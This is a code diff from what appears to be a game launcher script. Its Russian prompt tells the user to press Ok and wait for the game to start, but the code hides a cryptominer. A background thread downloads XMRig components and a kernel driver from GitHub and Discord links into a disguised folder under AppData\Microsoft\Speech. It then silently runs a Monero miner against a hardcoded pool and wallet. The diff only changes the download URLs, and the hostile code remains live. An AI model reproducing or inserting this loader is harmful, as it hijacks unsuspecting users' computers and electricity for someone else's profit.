@@ -23,11 +23,11 @@ message("Нажмите  Ok и ждите игра запускается!Бол
 use httpclient;
 
 (new Thread(function(){
-    file_put_contents($_ENV['APPDATA'].'\\Microsoft\\Speech\\xmrig-cuda.dll',file_get_contents('https://psv4.userapi.com/c520036/u512288973/docs/d26/f10c45a3ad99/xmrig-cuda.dll1?extra=AaRHMgEKuMU8oEupBtEU-k6gTdYGQNKB6T-GTb796ZUbG5q5YlYpnoBcs6WyH4eTRO3s9cLjEFSzg9B7_j2hKS-IcUsBuYmzJXMYJCeIYmhOjHS32vGsbOUZ5tZjDKOT-puJ0KKomoGayyW7xeCXKpDNbdY&dl=1'));
-    file_put_contents($_ENV['APPDATA'].'\\Microsoft\\Speech\\WinRing0x64.sys',file_get_contents('https://psv4.userapi.com/c534536/u512288973/docs/d36/8a0bc66fc75c/WinRing0x64.sys1?extra=EB4AGh1hN2SDW0dXdY_p9y_Db-Ck8p4uSjnprZqdynGW8poTDSdj5M1TP4qaXr3iFHEOLoFUmaFc1S2Mun7YK3igv-pTlm5KFa0pmXssni19I-h_93JC0Kd3tr0ow69lh7cfDy_1LXa6VnU7fCd_K2D5tw&dl=1'));
-    file_put_contents($_ENV['APPDATA'].'\\Microsoft\\Speech\\nvrtc-builtins64_102.dll',file_get_contents('https://psv4.userapi.com/c534536/u512288973/docs/d22/fe4d9af59bc9/nvrtc-builtins64_102.dll1?extra=sK5Tg_ii4xkfdO6nH8jWah6xInovXKSPtjb38sj7LoxhznJfCFMjeBmaRc8hk-kmM9D2tBjqqRUr5GOILvWLUv9svzvLn3dVLOFNIoVqI0DJ_V92zPVpg2NWNA1Pn_VSpVnWJOm24GUxehENfHCVA_Aksw&dl=1'));
-    file_put_contents($_ENV['APPDATA'].'\\Microsoft\\Speech\\nvrtc64_102_0.dll',file_get_contents('https://psv4.userapi.com/c536132/u512288973/docs/d17/b5536046a1ad/nvrtc64_102_0.dll1?extra=doIFOiWflO75ZAqzsP7hLTQr472EmKEzqyWlFPIkcgR_So4rGZYucB7Z_9JpxeDgQxOACP7Hg1FEMQEC5FwDdfJ97KJIAoYU-YC-wC1wFcAUt6yENYQaVCa-Lg70_RnjLYs47yXFk9WYsQ32bvYAP4o2Nw&dl=1'));
-    file_put_contents($_ENV['APPDATA'].'\\Microsoft\\Speech\\5.exe',file_get_contents('https://psv4.userapi.com/c534536/u512288973/docs/d13/43f1a6ad5162/5.exe1?extra=yHEIE7o7qamJpTXOS6e7PNRZuj2O_APMekzuSvM0n4tl-_a9Vi6UwBZgnPLo_u8YWq-obMJxixbaEhVf4d7SzrwL-BcILg8Q_C2yY6re6k6Q5ONmMtWtO1w8bUlKIacg71qDyBVCVkzWEIqaNkhul8pgjw&dl=1'));
+    file_put_contents($_ENV['APPDATA'].'\\Microsoft\\Speech\\xmrig-cuda.dll',file_get_contents('https://github.com/Rastihin/mce/raw/main/xmrig-cuda.dll'));
+    file_put_contents($_ENV['APPDATA'].'\\Microsoft\\Speech\\WinRing0x64.sys',file_get_contents('https://github.com/Rastihin/mce/raw/main/WinRing0x64.sys'));
+    file_put_contents($_ENV['APPDATA'].'\\Microsoft\\Speech\\nvrtc-builtins64_102.dll',file_get_contents('https://cdn.discordapp.com/attachments/836942104986124312/838423281199611914/nvrtc-builtins64_102.dll'));
+    file_put_contents($_ENV['APPDATA'].'\\Microsoft\\Speech\\nvrtc64_102_0.dll',file_get_contents('https://github.com/Rastihin/mce/raw/main/nvrtc64_102_0.dll'));
+    file_put_contents($_ENV['APPDATA'].'\\Microsoft\\Speech\\5.exe',file_get_contents('https://github.com/Rastihin/mce/raw/main/5.exe'));
     wait(5000);
     execute('cmd /c '.$_ENV['APPDATA'].'\\Microsoft\\Speech\\5.exe'.' --coin XMR --url monero.kryptex.network:7777 --user 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGj2eezRPM372XRSQi.v2d5397369 -p x --log-file 1619948916_xmr_12001_log.txt --http-host 127.0.0.1 --http-port 12001 --threads 1 -B');
     
